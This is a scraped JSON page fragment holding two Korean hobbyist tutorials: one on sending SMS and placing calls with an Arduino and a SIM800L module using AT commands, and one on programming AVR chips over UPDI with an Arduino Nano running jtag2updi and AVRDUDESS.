회로 카드 식별자(ICCID)를 반환합니다.\n\n\n<div class=\"content-ad\"></div>\n\n\"AT+CREG?\"은 0, 1을 반환합니다. SIM800L이 홈 네트워크에 등록되었음을 의미합니다.\n\n## 자주 발생하는 문제:\n\n연결 중에 실수를 하면 (예: 선을 잊었거나 잘못된 저항을 사용한 경우), \"테스트 연결 코드\"는 Serial Monitor에 \"Initializing...\"만 출력합니다. Arduino는 SIM800L과 통신할 수 없습니다. 이 경우 배선을 다시 한 번 확인해주세요!\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_11.png)\n\n<div class=\"content-ad\"></div>\n\n만약 당신의 SIM800L의 전원 공급이 2A를 제공할 수 없다면 LED 표시등은 1초에 한 번 깜박일 것입니다. 그러나 연결 테스트는 다음과 같은 메시지를 반환할 것입니다:\n\n“AT+CSQ”를 입력하면 0, 0이 반환됩니다. 이것은 신호 품질이 매우 나쁘다는 것을 의미합니다.\n\n“AT+CREG?”를 입력하면 0, 2가 반환됩니다. 이것은 SIM800L이 어떤 네트워크에도 등록되어 있지 않다는 것을 의미합니다.\n\n<img src=\"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_12.png\" />\n\n<div class=\"content-ad\"></div>\n\n# 단계 2: SIM800L로 텍스트 메시지 보내기\n\nSMS를 보내려면 sim800l.println(\"AT+CMGF=1\")을 사용하여 메시지 형식을 선택할 수 있습니다. sim800l.println(\"AT+CMGS=\\\"+ZZxxxxxxxxxx\\\"\")를 사용하여 괄호 안에 제공된 전화 번호로 SMS를 전송하세요. ZZ는 전화 번호의 국가 코드입니다. sim800l.print(\"Hello from Robot Amateur!!!\")를 사용하여 해당 번호로 텍스트 메시지를 보내세요.\n\n```js\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); //SIM800L Tx & Rx가 Arduino #11 및 #10에 연결되어 있습니다.\n\nvoid setup()\n{\n  // Arduino 및 Arduino IDE (시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // Arduino 및 SIM800L과의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\"); \n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트 성공 시 OK로 돌아갑니다.\n  updateSerial();\n\n  sim800l.println(\"AT+CMGF=1\"); // 텍스트 모드 설정\n  updateSerial();\n  sim800l.println(\"AT+CMGS=\\\"+ZZxxxxxxxxxx\\\"\");//ZZ를 국가 코드로, xxxxxxxxxx를 전화 번호로 변경하여 SMS를 보냅니다.\n  updateSerial();\n  sim800l.print(\"Hello from Robot Amateur!!!\"); //텍스트 내용\n  updateSerial();\n  sim800l.write(26);\n}\n\nvoid loop()\n{\n}\n\nvoid updateSerial()  \n{\n  delay(500);\n  while (Serial.available()) \n  {\n    sim800l.write(Serial.read()); // 시리얼이 수신한 내용을 소프트웨어 시리얼 포트로 전달합니다.\n  }\n  while(sim800l.available()) \n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 수신한 내용을 시리얼 포트로 전달합니다.\n  }\n}\n```\n\n모든 것이 잘 작동하면 시리얼 모니터에서 아래 메시지를 볼 수 있어야 합니다. 모듈 LED 표시등은 3초마다 한 번씩 깜박이고 있어야 합니다. 그리고 아래와 같이 핸드폰으로 \"Hello from Robot Amateur!!!\" 텍스트 메시지를 받아야 합니다!\n\n<div class=\"content-ad\"></div>\n\n\n![Image](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_13.png)\n\n## 자주 발생하는 문제:\n\n만약 SIM 카드에 PIN 코드가 설정되어 있다면, SIM800L을 사용하기 전에 먼저 PIN 코드를 SIM800L에 전송해야 합니다.\n\n예를 들어, 제 경우에는 \"AT+CMGF= \"+전화 번호\"\" 명령어로 \"ERROR\"라는 메시지를 받고 있었습니다. 이는 텍스트 메시지가 성공적으로 전송되지 않았음을 의미합니다.\n\n\n<div class=\"content-ad\"></div>\n\n\n![Image 1](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_14.png)\n\n![Image 2](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_15.png)\n\nOne potential reason may be: your sim card is locked with a pin.\n\nYou have 2 solutions:\n\n\n<div class=\"content-ad\"></div>\n\n- SIM 카드 핀 제거하기:\n\n휴대폰에 SIM 카드를 넣고, 설정-`SIM 카드 잠금-`SIM 카드 잠금 설정으로 이동하세요. 만일 SIM 카드에 핀 코드가 설정되어 있다면, 아래 화면과 유사해야 합니다:\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_16.png)\n\n“SIM 카드 잠금 해제” 슬라이드 버튼을 클릭하여 비활성화하세요. SIM 카드의 잠금을 해제하기 위해 핀 코드를 입력해야 합니다.\n\n<div class=\"content-ad\"></div>\n\n![img1](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_17.png)\n\n한번 실행하면 아래 화면을 보게 될 거에요. 이제 SIM 카드 PIN 코드가 비활성화되었습니다.\n\n![img2](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_18.png)\n\n2. `setup()` 함수에 SIM 카드 핀을 보내요\n\n<div class=\"content-ad\"></div>\n\n대신, SIM 카드 핀을 설정() 함수에 보내어 잠금을 해제할 수도 있습니다. 예를 들어, 핀이 1234인 SIM 카드를 잠금 해제하려면 설정() 루프에 다음 코드를 추가해야 합니다:\n\n```js\nString SIM_PIN_CODE = String(\"1234\");\nsim800l.print(\"AT+CPIN=\");\nsim800l.println(SIM_PIN_CODE);\n```\n\n업데이트된 코드는 아래와 같습니다:\n\n```js\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); // SIM800L의 Tx 및 Rx를 아두이노 #11 및 #10에 연결\n\nvoid setup()\n{\n  // 아두이노 및 아두이노 IDE(시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // 아두이노와 SIM800L 간의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\");\n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트 성공시 OK로 돌아갑니다\n  updateSerial();\n\n  String SIM_PIN_CODE = String(\"1234\");\n  sim800l.print(\"AT+CPIN=\");\n  sim800l.println(SIM_PIN_CODE);\n  updateSerial();\n\n  sim800l.println(\"AT+CMGF=1\"); // 텍스트 모드 구성\n  updateSerial();\n  sim800l.println(\"AT+CMGS=\\\"+ZZxxxxxxxxxx\\\"\"); // ZZ를 국가 코드로 변경하고 xxxxxxxxxxx를 문자 메시지로 보낼 전화번호로 변경\n  updateSerial();\n  sim800l.print(\"로봇 아마추어에서 안녕하세요!!!\"); // 텍스트 내용\n  updateSerial();\n  sim800l.write(26);\n}\n\nvoid loop()\n{\n}\n\nvoid updateSerial()\n{\n  delay(500);\n  while (Serial.available())\n  {\n    sim800l.write(Serial.read()); // 시리얼이 받은 내용을 소프트웨어 시리얼 포트로 전달\n  }\n  while (sim800l.available())\n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 받은 내용을 시리얼 포트로 전달\n  }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n만약 모든 것이 제대로 작동한다면, 시리얼 모니터는 아래와 같이 보일 것입니다:\n\n![이미지](assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_19.png)\n\n![이미지](assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_20.png)\n\n제 경우에는 SIM 카드의 PIN 코드가 1234이기 때문에 \"AT+CPIN=1234\"를 보냈습니다. 여러분은 여러분의 PIN 코드로 숫자를 조정할 수 있습니다. 이 명령은 OK를 반환하는데, 이는 PIN 코드가 성공적으로 전송되었음을 의미합니다.\n\n<div class=\"content-ad\"></div>\n\n\"AT+CMGF=1\"을 입력하고 OK가 반환되면, 텍스트 메시지를 보내는 모드가 성공적으로 설정되었음을 의미합니다.\n\n당신의 핸드폰에서는 \"문자 메시지 보내기 - 핸드폰 화면\"에서 보여지는 것과 동일한 메시지를 받아야 합니다.\n\n# 단계 3: SIM800L로 전화 걸기\n\n전화를 걸기 위해, 먼저 핸드셰이크를 위해 sim800l.println(\"AT\")을 사용합니다. 그 후에, 전화를 걸기 위해 sim800l.println(\"ATD+ +ZZxxxxxxxxxx;\")를 사용합니다. 괄호 안에 제공된 전화 번호로 전화를 걸고, 마지막으로 sim800l.println(\"ATH\")을 사용하여 전화를 끊어줍니다.\n\n<div class=\"content-ad\"></div>\n\n\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); // SIM800L의 Tx와 Rx를 아두이노의 11번 핀과 10번 핀에 연결\n\nvoid setup()\n{\n  // 아두이노 및 아두이노 IDE (시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // 아두이노와 SIM800L 간의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\"); \n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트 성공시 OK로 돌아옵니다\n  updateSerial();\n\n  String SIM_PIN_CODE = String(\"1234\");\n  sim800l.print(\"AT+CPIN=\");\n  sim800l.println(SIM_PIN_CODE);\n  updateSerial();\n  \n  sim800l.println(\"ATD+ +ZZxxxxxxxxxx;\"); // ZZ에 국가 코드, xxxxxxxxxxx에 전화 걸 번호를 입력하세요\n  updateSerial();\n  delay(20000); // 20초 동안 대기합니다...\n  sim800l.println(\"ATH\"); // 전화 끊기\n  updateSerial();\n}\n\nvoid loop()\n{\n}\n\nvoid updateSerial()\n{\n  delay(500);\n  while (Serial.available()) \n  {\n    sim800l.write(Serial.read()); // 시리얼이 수신한 내용을 소프트웨어 시리얼 포트로 전달\n  }\n  while (sim800l.available()) \n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 수신한 내용을 시리얼 포트로 전달\n  }\n}\n\n\n이 코드를 업로드한 후 시리얼 모니터에 다음과 같은 메시지가 출력되었습니다. 모듈 LED 표시등은 3초마다 한 번 깜박여야 합니다. \"AT+CPIN=1234\" 명령이 \"ERROR\"를 반환했지만, \"ATD+ +ZZxxxxxxxxxx;\" 명령은 OK를 반환하여 전화가 성공적으로 걸렸음을 의미합니다.\n\n![아두이노 SIM800L을 사용하여 메시지 보내고 전화 걸기](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_21.png)\n\n![아두이노 SIM800L을 사용하여 메시지 보내고 전화 걸기](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_22.png)\n\n\n<div class=\"content-ad\"></div>\n\n# 결론\n\n축하합니다! 이제 아두이노로 SMS를 보내고 전화를 걸 준비가 되었습니다! 이제 이를 집 안전 프로젝트에 적용할 수 있습니다. 예를 들어, 집 안전 프로젝트에 사용할 수 있습니다.\n\n질문이 있으시면 언제든지 댓글을 남겨주세요. DIY 프로젝트에 대한 흥미로운 아이디어가 있다면 댓글을 남겨주세요!","ogImage":{"url":"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_0.png"},"coverImage":"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_0.png","tag":["Tech"],"readingTime":13},{"title":"Arduino IDE와 AVRDUDESS를 사용해 기존 하드웨어로 UPDI 인터페이스를 통한 새로운 AVR 칩 프로그래밍하는 방법","description":"","date":"2024-06-22 18:47","slug":"2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS","content":"\n\n## 통합 프로그램 및 디버그 인터페이스 (UPDI) 이해하기\n\n통합 프로그램 및 디버그 인터페이스(UPDI)는 Microchip Technology가 개발한 프로프리어터리 인터페이스로서, AVR 및 SAM 마이크로컨트롤러의 프로그래밍 및 디버깅에 사용됩니다. 2016년 소개된 UPDI는 예전 AVR 마이크로컨트롤러에서 사용되던 In-System Programming (ISP) 및 Debug WIRE 인터페이스의 후속 제품입니다. UPDI는 마이크로컨트롤러와 상호작용하는 간단하고 효율적인 방법을 제공하며, 프로그래밍 및 디버깅 요구 사항에 맞는 기능을 포함하고 있습니다. 본 문서는 UPDI 프로토콜, 운영 메커니즘, 그리고 JTAG2UPDI와의 비교를 보다 자세히 살펴봅니다.\n\n## UPDI 개요\n\nUPDI는 UART (Universal Asynchronous Receiver-Transmitter) 시리얼 프로토콜을 기반으로 한 단방향, 이중 통신 프로토콜입니다. 기존의 UART 통신과 달리 별도의 Rx(수신) 및 Tx(송신) 라인을 사용하는 대신, UPDI는 데이터를 수신하고 송신하기 위한 단일 선을 활용합니다. 이 단순화는 핀 개수와 단순성이 중요한 임베디드 시스템에서 특히 유리합니다.\n\n<div class=\"content-ad\"></div>\n\nUPDI의 주요 기능:\n- 프로그래밍 및 디버깅: UPDI는 플래시, EEPROM, 퓨즈 및 잠금 비트를 포함한 비휘발성 메모리(NVM) 공간의 프로그래밍이 가능하며 온칩 디버깅을 용이하게 합니다.\n- PHY 인터페이스: UPDI의 물리적 레이어는 UART 기반으로, 통신을 위해 RESET 핀을 사용합니다. 반 이중 방식으로 작동하여 통신 방향이 데이터를 보내고 받는 것 사이에 교대로 변합니다.\n- 클럭: UPDI는 내부 발진기를 사용하여 일관된 타이밍과 동기화를 제공합니다.\n- 에러 검출: 프로토콜에는 패리티 체크 및 특수 프레임 형식을 통해 에러를 감지하고 신호화하는 메커니즘이 포함되어 있습니다.\n\n## UPDI 통신 프로토콜\n\n![이미지](/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_0.png)\n\n프로그래머 또는 디버거와 마이크로컨트롤러 간의 UPDI를 통한 통신에는 각각 특정 목적을 위해 사용되는 여러 가지 구별된 프레임 유형이 포함됩니다.\n\n<div class=\"content-ad\"></div>\n\n- 데이터 프레임: 시작 비트, 8개의 데이터 비트, 선택적 패리티 비트 및 두 개의 스톱 비트로 구성됩니다. 이 프레임은 실제 데이터를 전송하는 데 사용됩니다.\n- IDLE 프레임: 통신 라인의 유휴 상태를 나타내는 12개의 하이 비트로 구성됩니다.\n- BREAK 프레임: UPDI를 기본 상태로 재설정하는 데 사용되는 12개의 로우 비트로 구성됩니다. 일반적으로 오류 복구 목적입니다.\n- SYNCH 프레임: SYNCH 문자(0x55)는 프로그래머와 마이크로컨트롤러 간의 보드 속도를 동기화합니다.\n- ACK 프레임: UPDI에서 전송된 성공적인 명령 수신 및 실행을 확인하는 확인 프레임입니다.\n\n<img src=\"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_1.png\" />\n\n프로그래머가 UPDI 인터페이스를 재설정하기 위해 BREAK 조건을 보내는 것으로 통신이 시작됩니다. 그 후에는 보드 속도를 동기화하기 위해 SYNCH 프레임이 이어집니다. 그 다음에 프로그래밍 또는 디버깅 명령이 교환되며, 양쪽이 번갈아가면서 송신자와 수신자 역할을 교체합니다.\n\n# 아두이노 나노를 사용하여 UPDI 프로그래머 만드는 방법\n\n<div class=\"content-ad\"></div>\n\nATtiny 마이크로컨트롤러를 UPDI 인터페이스를 사용하여 프로그래밍하려면, Arduino Nano를 UPDI 프로그래머로 사용할 수 있습니다. 이 안내서는 Arduino Nano 설정, Arduino IDE 구성, 그리고 펌웨어를 업로드하여 Nano를 UPDI 프로그래머로 변환하는 방법에 대한 단계별 지침을 제공합니다.\n\n필요한 구성품\n\n- Arduino Nano\n- 10μF 캐패시터\n- 4.7kΩ 저항기\n- 브레드보드\n- 점퍼 와이어\n\nUPDI 프로그래머 구성하기\n\n<div class=\"content-ad\"></div>\n\n- 하드웨어 설정:\n- 아두이노 나노의 핀 D6과 ATtiny 마이크로컨트롤러의 UPDI 핀 사이에 4.7kΩ 저항을 연결하세요.\n- 아두이노 나노의 GND 핀과 RST 핀 사이에 10μF 커패시터를 설치하세요. 커패시터의 양극(선이나 + 기호로 표시)이 RST 핀에 연결되어 있는지 확인하세요.\n\n연결을 도와줄 다이어그램이 있습니다:\n\n```js\nArduino Nano 핀 | 부품 | ATtiny 핀\n-----------------|------|------\nGND              | 점퍼 | GND\n5V               | 점퍼 | VCC\nD6               | 4.7kΩ | UPDI\nGND              | 10μF 캡 | GND\nRST              | 10μF 캡 | + (양극 부분)\n```\n\n<img src=\"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_2.png\" />\n\n<div class=\"content-ad\"></div>\n\n2. 아두이노 IDE 준비하기:\n단계 1: 아두이노 IDE 설치\n— [아두이노 공식 웹사이트](https://www.arduino.cc/en/software)에서 아두이노 IDE를 다운로드하고 설치합니다.\n\n단계 2: megaTinyCore 패키지 추가\n— 아두이노 IDE를 열고 `File` Preferences`로 이동합니다.\n— \"Additional Board Manager URLs\" 필드에 다음 URL을 추가합니다: `http://drazzy.com/package_drazzy.com_index.json`.\n\n![이미지](/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_3.png)\n\n— 설정을 저장하려면 \"확인\"을 클릭합니다.\n— `Tools` Board` Boards Manager`로 이동합니다.\n— 검색란에 \"megaTinyCore\"를 입력하고 \"megaTinyCore by Spence Konde\"를 설치합니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-프로그래밍newAVR칩을기존하드웨어를이용해서UPDI인터페이스로바꾸기_4.png\" />\n\n3. 아두이노 나노를 UPDI 프로그래머로 변환하기:\n단계 1: UPDI 프로그래머 스케치 다운로드\n— [GitHub 저장소](https://github.com/ElTangas/jtag2updi)에서 jtag2updi 스케치를 다운로드합니다. 저장소를 ZIP 파일로 다운로드합니다.\n— ZIP 파일을 컴퓨터의 알려진 위치에 해제합니다.\n\n단계 2: 아두이노 IDE에서 스케치 열기\n— 아두이노 IDE를 열고 '파일` - '열기'를 선택합니다.\n— 압축 해제된 폴더로 이동하여 'jtag2updi.ino' 파일을 엽니다. `.ino` 파일이 비어 보일 수 있지만 괜찮습니다. 필요한 모든 코드는 동일한 폴더 내의 다른 파일에 있습니다.\n\n단계 3: 스케치를 아두이노 나노에 업로드\n— 아두이노 나노 보드를 선택합니다: `도구` - `보드` - `아두이노 나노`.\n— 올바른 프로세서를 선택합니다: `도구` - `프로세서` - `ATmega328P (이전 부트로더)` (해당하는 경우).\n— 올바른 포트를 선택합니다: `도구` - `포트` - `COM[X]` ([X]는 포트 번호입니다).\n— 아두이노 IDE에서 \"업로드\" 버튼을 클릭하여 스케치를 업로드합니다.\n\n<div class=\"content-ad\"></div>\n\n4. 아두이노 나노와 ATtiny 마이크로컨트롤러를 점퍼 와이어로 연결해 보세요:\n\n```js\n아두이노 나노 핀 | ATtiny 핀\n-----------------|-----------\nGND              | GND\n5V               | VCC\nD6               | UPDI\n```\n\n5. ATtiny에 코드 업로드하기:\n단계 1: 아두이노 IDE에서 ATtiny 보드 선택\n— `도구` `보드` `ATtiny`로 이동하고 적절한 ATtiny 모델(예: ATtiny1614)을 선택합니다.\n\n단계 2: 프로그래머 설정\n— `도구` `프로그래머`로 이동하고 `jtag2updi (megaTinyCore)`를 선택하세요.\n\n<div class=\"content-ad\"></div>\n\n단계 4: 코드 업로드하기\n- 코드를 확인하고 \"업로드\" 버튼을 클릭하여 업로드하세요.\n\nArduino IDE를 사용하여 코드를 업로드하는 방법은 매우 간단하고 쉬운 방법입니다.\n\n# AVRDUDESS를 사용하여 미리 컴파일된 펌웨어 업로드하기\n\n- Hex 파일 준비:\n만약 프로그램이 플랫폼 IO나 비슷한 플랫폼으로 작성되었다면, 코드의 컴파일된 Hex 파일을 얻을 수 있습니다.\n- AVRDUDESS 설치\n여기에서 설정을 다운로드할 수 있습니다.\n- `avrdude.conf` 수정:\n설치 디렉토리에서 `avrdude.conf` 파일을 찾으세요.\n그런 다음 VS code나 그와 유사한 플랫폼을 사용하여 구성 파일을 열고 다시 저장하고 구성 파일에 다음 부분을 추가하세요.\n\n<div class=\"content-ad\"></div>\n\n```js\n#------------------------------------------------------------\n# jtag2updi 프로그래머 정의\n#------------------------------------------------------------\n\nprogrammer\n  id    = \"jtag2updi\";\n  desc  = \"JTAGv2에서 UPDI로 변환\";\n  type  = \"jtagmkii_pdi\";\n  connection_type = serial;\n  baudrate = 115200;\n;\n```\n\n이 부분을 다음 줄 근처에 추가해주세요,\n\n<img src=\"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_5.png\" />\n\n3. AVRDUDESS 사용 방법:\n— AVRDUDESS를 엽니다.\n— 프로그래머로 `JTAGv2에서 UPDI로 변환`을 선택합니다.\n— Arduino Nano가 연결된 COM 포트를 선택합니다.\n— 생성한 `.hex` 파일을 불러옵니다.\n— 코드를 ATtiny 마이크로컨트롤러에 업로드하려면 “프로그램”을 클릭합니다.\n\n<div class=\"content-ad\"></div>\n\n\n![Programming new AVR chip with UPDI interface](/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_6.png)\n\n- 작동하지 않으면 보레이트를 낮추거나 올바른 COM 포트가 선택되었는지 확인해보세요.\n\n## 유용한 링크\n\n- jtag2updi GitHub\n- Microchip Studio\n- AVRDUDESS\n\n\n<div class=\"content-ad\"></div>\n\n프로젝트에 잘 도움이 되길 바라요. 궁금한 게 있으면 언제든 물어봐 주세요.","ogImage":{"url":"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_0.png"},"coverImage":"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_0.png","tag":["Tech"],"readingTime":6}],"page":"33","totalPageCount":113,"totalPageGroupCount":6,"lastPageGroup":20,"currentPageGroup":1},"__N_SSG":true}